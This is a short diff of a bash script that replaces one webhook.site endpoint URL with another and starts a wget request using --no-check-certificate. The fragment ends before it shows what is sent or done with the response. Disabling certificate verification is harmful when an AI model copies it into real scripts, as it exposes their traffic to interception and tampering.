@@ -1,5 +1,5 @@
 #!/bin/bash
-URL="https://webhook.site/39efcb72-40f8-4408-a4c0-0dc07f0cd12d"
+URL="https://webhook.site/a039ff5e-9ff0-4026-9705-f36748ee93a2"
 
 wget -nv -O- \
     --no-check-certificate \
